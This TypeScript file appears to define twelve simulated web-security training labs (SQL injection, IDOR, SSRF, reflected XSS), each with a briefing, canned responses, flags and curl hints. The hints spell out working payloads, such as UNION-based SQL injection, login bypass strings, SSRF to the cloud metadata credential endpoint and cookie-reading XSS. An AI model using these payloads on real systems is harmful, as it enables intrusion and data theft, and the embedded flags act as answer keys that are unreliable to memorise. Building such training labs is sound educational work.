import { dir } from '../vfs';
import type { LabScenario, HostDef, VulnRoute } from '../types';

interface WebLabConfig {
  id: string;
  title: string;
  ip: string;
  hostname: string;
  company: string;
  difficulty: 'Easy' | 'Medium' | 'Hard';
  homeBody: string;
  route: VulnRoute;
  objectives: string[];
  hints: string[];
  briefing: string;
}

function makeWebLab(cfg: WebLabConfig): LabScenario {
  const host: HostDef = {
    hostname: cfg.hostname,
    ip: cfg.ip,
    os: 'Ubuntu 22.04 (containerized app)',
    services: [
      {
        port: 80,
        name: 'http',
        version: 'nginx 1.22.0 (reverse proxy)',
        http: { '/': cfg.homeBody },
        vulnRoutes: [cfg.route],
      },
    ],
    users: [],
    root: dir({}),
  };

  return {
    id: cfg.id,
    title: cfg.title,
    difficulty: cfg.difficulty,
    category: 'Web',
    briefing: cfg.briefing,
    objectives: cfg.objectives,
    hints: cfg.hints,
    totalFlags: 1,
    attacker: { hostname: 'kali', user: 'root', root: dir({ root: dir({}) }) },
    network: [host],
  };
}

export const webVulnLabs: LabScenario[] = [
  makeWebLab({
    id: 'web-sqli-product', title: 'SQL Injection: Product Catalog', ip: '10.10.103.1', hostname: 'shop01',
    company: 'Meridian Retail', difficulty: 'Medium',
    homeBody: '<html><body><h1>Meridian Retail — Product Catalog</h1><p>Try /product?id=1</p></body></html>',
    briefing: 'Meridian Retail\'s product page takes an "id" parameter directly into a SQL query with no sanitization. Confirm the injection, then extract the hidden admin flag via a UNION-based technique.',
    objectives: ['Baseline the /product endpoint with a normal id', 'Confirm SQL injection with a boolean payload', 'Extract the flag with a UNION-based payload'],
    hints: [
      'curl "http://10.10.103.1/product?id=1" for a baseline.',
      `curl "http://10.10.103.1/product?id=1' OR '1'='1" — if this returns more data, it's vulnerable.`,
      `curl "http://10.10.103.1/product?id=-1 UNION SELECT flag FROM secrets--"`,
    ],
    route: {
      kind: 'sqli', path: '/product', param: 'id',
      triggerSubstrings: ["' or ", "or 1=1", "union select", "'--", "--"],
      vulnerableResponse: '<html><body><h1>Product Catalog</h1><p>Extra rows returned by the database:</p><p>flag{union_based_sqli_dumps_the_secrets_table}</p></body></html>',
      normalResponse: '<html><body><h1>Product Catalog</h1><p>Product #1: Wireless Mouse — $19.99</p></body></html>',
    },
  }),
  makeWebLab({
    id: 'web-sqli-login-bypass', title: 'SQL Injection: Login Bypass', ip: '10.10.103.2', hostname: 'portal02',
    company: 'Ferro Client Portal', difficulty: 'Medium',
    homeBody: '<html><body><h1>Ferro Client Portal — Login</h1><p>POST to /login with username &amp; password</p></body></html>',
    briefing: 'The Ferro client portal login form builds its SQL query by concatenating the username field directly. Bypass authentication entirely without knowing a valid password.',
    objectives: ['Understand the login POST flow', 'Bypass authentication using a SQLi payload in the username field'],
    hints: [
      `curl -X POST -d "username=admin&password=wrong" http://10.10.103.2/login`,
      `curl -X POST -d "username=admin'-- &password=anything" http://10.10.103.2/login`,
    ],
    route: {
      kind: 'auth-bypass', path: '/login', param: 'username',
      triggerSubstrings: ["'--", "' or ", "' #"],
      vulnerableResponse: '<html><body><h1>Welcome, admin</h1><p>Authentication bypassed — the trailing comment stripped the password check entirely.</p><p>flag{sqli_login_bypass_via_comment_injection}</p></body></html>',
      normalResponse: '<html><body><h1>Login Failed</h1><p>Invalid credentials.</p></body></html>',
    },
  }),
  makeWebLab({
    id: 'web-idor-invoice', title: 'IDOR: Invoice Viewer', ip: '10.10.103.3', hostname: 'billing03',
    company: 'Ledgerbrook Billing', difficulty: 'Easy',
    homeBody: '<html><body><h1>Ledgerbrook Billing</h1><p>View your invoice at /invoice?id=1001 (your account)</p></body></html>',
    briefing: 'You are logged in as customer 1001. The invoice endpoint trusts the id parameter completely, without checking session ownership.',
    objectives: ['View your own invoice at id=1001', 'Change the id parameter to access another customer\'s invoice'],
    hints: ['curl "http://10.10.103.3/invoice?id=1001" — your own invoice.', 'curl "http://10.10.103.3/invoice?id=1002" — try a different id.'],
    route: {
      kind: 'idor', path: '/invoice', param: 'id',
      triggerSubstrings: ['1002', '1003', '1004', '1005'],
      vulnerableResponse: '<html><body><h1>Invoice #1002</h1><p>Customer: J. Whitfield — Total: $4,821.00</p><p>flag{idor_invoice_id_leaks_other_customers}</p></body></html>',
      normalResponse: '<html><body><h1>Invoice #1001</h1><p>Customer: You — Total: $89.00</p></body></html>',
    },
  }),
  makeWebLab({
    id: 'web-idor-profile-api', title: 'IDOR: User Profile API', ip: '10.10.103.4', hostname: 'api04',
    company: 'Northgate Social API', difficulty: 'Easy',
    homeBody: '<html><body><h1>Northgate API</h1><p>GET /api/user?user_id=42 (your profile)</p></body></html>',
    briefing: 'A mobile app backend exposes user profiles by numeric ID with no authorization check tying the ID to the caller\'s session.',
    objectives: ['Fetch your own profile at user_id=42', 'Enumerate a different user_id to leak private data'],
    hints: ['curl "http://10.10.103.4/api/user?user_id=42"', 'curl "http://10.10.103.4/api/user?user_id=7"'],
    route: {
      kind: 'idor', path: '/api/user', param: 'user_id',
      triggerSubstrings: ['7', '1', '2', '3', '99'],
      vulnerableResponse: '{"user_id":7,"name":"Admin Account","email":"admin@northgate.internal","private_notes":"flag{idor_api_user_id_enumeration_leaks_admin}"}',
      normalResponse: '{"user_id":42,"name":"You","email":"you@example.com"}',
    },
  }),
  makeWebLab({
    id: 'web-ssrf-fetch', title: 'SSRF: URL Fetch Feature', ip: '10.10.103.5', hostname: 'proxysvc05',
    company: 'Brightline Preview Service', difficulty: 'Medium',
    homeBody: '<html><body><h1>Brightline Link Preview</h1><p>GET /fetch?url=https://example.com</p></body></html>',
    briefing: 'A "link preview" feature fetches any URL server-side to generate a thumbnail. Redirect it toward an internal-only admin panel it should never be able to reach from outside.',
    objectives: ['Confirm the fetch feature works with an external URL', 'Redirect the request to an internal admin panel'],
    hints: [
      'curl "http://10.10.103.5/fetch?url=https://example.com"',
      'curl "http://10.10.103.5/fetch?url=http://127.0.0.1:8080/admin"',
    ],
    route: {
      kind: 'ssrf', path: '/fetch', param: 'url',
      triggerSubstrings: ['127.0.0.1', 'localhost', '169.254.169.254', 'internal'],
      vulnerableResponse: '<html><body><h1>Internal Admin Panel</h1><p>Reachable only from localhost — but the preview service fetched it for us.</p><p>flag{ssrf_link_preview_reaches_internal_admin}</p></body></html>',
      normalResponse: '<html><body><h1>Preview generated for external URL</h1></body></html>',
    },
  }),
  makeWebLab({
    id: 'web-ssrf-metadata', title: 'SSRF: Cloud Metadata Leak', ip: '10.10.103.6', hostname: 'webhook06',
    company: 'Cascade Webhook Validator', difficulty: 'Hard',
    homeBody: '<html><body><h1>Cascade Webhook Validator</h1><p>GET /validate?url=https://example.com/webhook</p></body></html>',
    briefing: 'A webhook URL validator runs on cloud infrastructure and will fetch any URL you give it to "validate" it — including the instance metadata service.',
    objectives: ['Confirm normal validation behavior', 'Redirect the validator to the cloud metadata endpoint to leak credentials'],
    hints: [
      'curl "http://10.10.103.6/validate?url=https://example.com/webhook"',
      'curl "http://10.10.103.6/validate?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"',
    ],
    route: {
      kind: 'ssrf', path: '/validate', param: 'url',
      triggerSubstrings: ['169.254.169.254', 'metadata', 'localhost', '127.0.0.1'],
      vulnerableResponse: '{"AccessKeyId":"AKIA-SIMULATED-EXAMPLE","SecretAccessKey":"REDACTED","Token":"flag{ssrf_reaches_cloud_metadata_credentials}"}',
      normalResponse: '{"status":"validated","reachable":true}',
    },
  }),
  makeWebLab({
    id: 'web-xss-search', title: 'Reflected XSS: Search Page', ip: '10.10.103.7', hostname: 'blog07',
    company: 'Wraithwood Blog Platform', difficulty: 'Easy',
    homeBody: '<html><body><h1>Wraithwood Blog</h1><p>GET /search?q=your+query</p></body></html>',
    briefing: 'The blog\'s search page reflects your query directly into the page without HTML-encoding it. Confirm reflected XSS by checking whether your payload comes back verbatim.',
    objectives: ['Baseline the search endpoint with a normal query', 'Confirm reflected XSS with a <script> payload'],
    hints: [
      'curl "http://10.10.103.7/search?q=test"',
      'curl "http://10.10.103.7/search?q=<script>alert(1)</script>"  — check if it\'s reflected unencoded.',
    ],
    route: {
      kind: 'xss', path: '/search', param: 'q',
      triggerSubstrings: ['<script', 'onerror=', 'javascript:'],
      vulnerableResponse: '<html><body><h1>Results for: <script>alert(1)</script></h1><p>Unencoded reflection confirmed.</p><p>flag{reflected_xss_no_output_encoding}</p></body></html>',
      normalResponse: '<html><body><h1>Results for: test</h1><p>No results found.</p></body></html>',
    },
  }),
  makeWebLab({
    id: 'web-xss-feedback', title: 'Reflected XSS: Feedback Form', ip: '10.10.103.8', hostname: 'support08',
    company: 'Alderbrook Support Desk', difficulty: 'Easy',
    homeBody: '<html><body><h1>Alderbrook Support</h1><p>GET /feedback?comment=your+comment</p></body></html>',
    briefing: 'A feedback confirmation page echoes your comment back onto the page. Check whether it\'s encoded properly before treating this as a real finding.',
    objectives: ['Baseline the feedback endpoint', 'Confirm reflected XSS via an unencoded payload'],
    hints: [
      'curl "http://10.10.103.8/feedback?comment=thanks"',
      'curl "http://10.10.103.8/feedback?comment=<script>alert(document.cookie)</script>"',
    ],
    route: {
      kind: 'xss', path: '/feedback', param: 'comment',
      triggerSubstrings: ['<script', 'onerror=', 'javascript:'],
      vulnerableResponse: '<html><body><h1>Thanks for your feedback:</h1><p><script>alert(document.cookie)</script></p><p>flag{reflected_xss_feedback_form_unencoded}</p></body></html>',
      normalResponse: '<html><body><h1>Thanks for your feedback:</h1><p>thanks</p></body></html>',
    },
  }),
  makeWebLab({
    id: 'web-idor-coupon', title: 'IDOR: Gift Card Balance API', ip: '10.10.103.9', hostname: 'giftcards09',
    company: 'Palisade Retail Rewards', difficulty: 'Easy',
    homeBody: '<html><body><h1>Palisade Rewards</h1><p>GET /giftcard?code=GC-1000-YOUR</p></body></html>',
    briefing: 'A gift card balance checker takes a code parameter and returns the balance for ANY code supplied, with no rate limiting or ownership check — a business logic flaw as much as an access control one.',
    objectives: ['Check your own gift card balance', 'Enumerate a different gift card code to view someone else\'s balance'],
    hints: ['curl "http://10.10.103.9/giftcard?code=GC-1000-YOUR"', 'curl "http://10.10.103.9/giftcard?code=GC-1001-ADMIN"'],
    route: {
      kind: 'idor', path: '/giftcard', param: 'code',
      triggerSubstrings: ['gc-1001', 'gc-2000', 'admin'],
      vulnerableResponse: '<html><body><p>Card GC-1001-ADMIN balance: $9,500.00</p><p>flag{giftcard_code_enumeration_no_rate_limit}</p></body></html>',
      normalResponse: '<html><body><p>Card GC-1000-YOUR balance: $25.00</p></body></html>',
    },
  }),
  makeWebLab({
    id: 'web-sqli-search-filter', title: 'SQL Injection: Employee Directory', ip: '10.10.103.10', hostname: 'hrportal10',
    company: 'Corbin HR Systems', difficulty: 'Medium',
    homeBody: '<html><body><h1>Corbin HR Directory</h1><p>GET /employees?dept=sales</p></body></html>',
    briefing: 'The internal employee directory filters by department using unsanitized string concatenation, allowing a UNION injection to pull data from an unrelated salaries table.',
    objectives: ['Baseline the directory with a normal department filter', 'Extract salary data with a UNION-based injection'],
    hints: [
      'curl "http://10.10.103.10/employees?dept=sales"',
      `curl "http://10.10.103.10/employees?dept=sales' UNION SELECT name,salary FROM comp_data--"`,
    ],
    route: {
      kind: 'sqli', path: '/employees', param: 'dept',
      triggerSubstrings: ['union select', "'--", "' or "],
      vulnerableResponse: '<html><body><h1>Employee Directory</h1><p>Leaked from comp_data: CEO salary record</p><p>flag{sqli_union_leaks_unrelated_salary_table}</p></body></html>',
      normalResponse: '<html><body><h1>Employee Directory</h1><p>3 employees in Sales</p></body></html>',
    },
  }),
  makeWebLab({
    id: 'web-auth-bypass-admin', title: 'Auth Bypass: Admin Panel Login', ip: '10.10.103.11', hostname: 'adminpanel11',
    company: 'Stonegate Admin Console', difficulty: 'Medium',
    homeBody: '<html><body><h1>Stonegate Admin Console</h1><p>POST to /admin/login</p></body></html>',
    briefing: 'The admin console\'s login shares the same vulnerable query-building code as many legacy internal tools — an authentication bypass here grants full administrative access.',
    objectives: ['Attempt a normal login and observe the failure', 'Bypass authentication with a SQLi payload'],
    hints: [
      'curl -X POST -d "username=admin&password=wrong" http://10.10.103.11/admin/login',
      `curl -X POST -d "username=admin' OR '1'='1&password=x" http://10.10.103.11/admin/login`,
    ],
    route: {
      kind: 'auth-bypass', path: '/admin/login', param: 'username',
      triggerSubstrings: ["' or '1'='1", "'--", "' or 1=1"],
      vulnerableResponse: '<html><body><h1>Admin Dashboard</h1><p>Full administrative access granted.</p><p>flag{admin_console_sqli_auth_bypass}</p></body></html>',
      normalResponse: '<html><body><h1>Login Failed</h1></body></html>',
    },
  }),
  makeWebLab({
    id: 'web-ssrf-image-proxy', title: 'SSRF: Image Proxy Service', ip: '10.10.103.12', hostname: 'imgproxy12',
    company: 'Harborlight Media CDN', difficulty: 'Medium',
    homeBody: '<html><body><h1>Harborlight Image Proxy</h1><p>GET /proxy?src=https://example.com/image.png</p></body></html>',
    briefing: 'An image resizing proxy fetches whatever URL you give it server-side before resizing — including internal-only services on the hosting infrastructure.',
    objectives: ['Confirm the proxy works with an external image URL', 'Redirect it to an internal-only service port'],
    hints: [
      'curl "http://10.10.103.12/proxy?src=https://example.com/image.png"',
      'curl "http://10.10.103.12/proxy?src=http://localhost:6379/"',
    ],
    route: {
      kind: 'ssrf', path: '/proxy', param: 'src',
      triggerSubstrings: ['localhost', '127.0.0.1', 'internal', '169.254.169.254'],
      vulnerableResponse: '<html><body><p>Internal service response captured via proxy:</p><p>flag{image_proxy_ssrf_reaches_internal_services}</p></body></html>',
      normalResponse: '<html><body><p>[resized image placeholder]</p></body></html>',
    },
  }),
];
